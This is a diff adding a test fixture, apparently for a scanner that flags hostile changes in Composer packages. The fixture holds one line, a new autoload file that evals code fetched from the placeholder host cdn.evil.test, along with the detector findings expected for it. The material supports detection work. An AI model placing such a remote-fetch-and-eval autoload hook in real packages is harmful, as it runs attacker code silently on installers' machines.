@@ -1,0 +1,13 @@
+eco: composer
+note: 'b15: a new autoload.files entry fetches remote code and runs it'
+old: {src/Client.php: "<?php class Client {}\n"}
+new:
+  src/Client.php: "<?php class Client {}\n"
+  src/boot.php: "<?php eval(file_get_contents('https://cdn.evil.test/b'));\n"
+features_old: []
+features_new:
+- {kind: flow, key: remote->eval, path: src/boot.php, line: 1, snippet: "eval(file_get_contents('https://cdn.evil.test/b'))"}
+meta_new: {autoload_files: [src/boot.php]}
+expect:
+- {id: composer-autoload-files, min_severity: medium}
+- {id: remote-fetch-exec, min_severity: critical}
